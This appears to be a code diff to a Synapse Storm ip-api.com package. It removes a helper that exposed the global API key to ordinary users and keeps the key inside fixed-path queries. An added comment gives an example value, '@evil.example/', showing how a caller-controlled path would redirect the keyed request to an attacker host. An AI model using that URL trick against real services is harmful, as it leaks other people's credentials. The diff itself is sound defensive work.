@@ -2,6 +2,11 @@
 // global API key, and reads of the tag settings. slib.ipapi.user users need no perms on the
 // globals or vaults used here.
 //
+// Every function here can be called by a slib.ipapi.user, a leading "_" doesn't make one
+// private. So no function returns the global API key, and it's only read in query() and
+// queryBatch(), whose request paths are fixed: a caller controlled path could send the key to
+// another host (ex. "@evil.example/" makes "https://pro.ip-api.com@evil.example/?key=...").
+//
 // NOTE: $lib.globals.get/set are the only global var APIs in Synapse 2.x, this package
 // requires Synapse <3.0.0 (see synapse_version), so R005 is ignored here.
 
@@ -45,15 +50,6 @@ function getIpApiTag() {
     }
 
     return($norm)
-}
-
-// The global ip-api.com pro key (set with slib.ipapi.admin.apikey), or (null).
-function globalKey() {
-    $vault = $lib.vault.bytype($vaultType, scope=global)
-    if ($vault = null) { return() }
-    $secrets = $vault.secrets
-    if ($secrets = null) { return() }
-    return($secrets.apikey)
 }
 
 // A decimal digit string as an int (leading zeros are fine).
@@ -226,7 +222,11 @@ function _request(kind, path, apikey, desc, body=(null)) {
 // result, with its "as" field as "as_" and parsed into "asnum" and "asorg".
 // apikey is the caller's own pro key, the global key is used when it's (null).
 function query(ipaddr, apikey=(null)) {
-    if (not $apikey) { $apikey = $globalKey() }
+    // The global key is read here, never returned, and only sent to the fixed /json path.
+    if (not $apikey) {
+        $vault = $lib.vault.bytype($vaultType, scope=global)
+        if ($vault and $vault.secrets) { $apikey = $vault.secrets.apikey }
+    }
     $retn = $_request(json, `/json/{$ipaddr}`, $apikey, $ipaddr)
     if (not $retn.status) { return($retn) }
     return($_toRetn($ipaddr, $retn.data))
@@ -245,7 +245,11 @@ function queryBatch(ipaddrs, apikey=(null)) {
         }
     }
 
-    if (not $apikey) { $apikey = $globalKey() }
+    // The global key is read here, never returned, and only sent to the fixed /batch path.
+    if (not $apikey) {
+        $vault = $lib.vault.bytype($vaultType, scope=global)
+        if ($vault and $vault.secrets) { $apikey = $vault.secrets.apikey }
+    }
 
     $retns = ([])
     $start = (0)
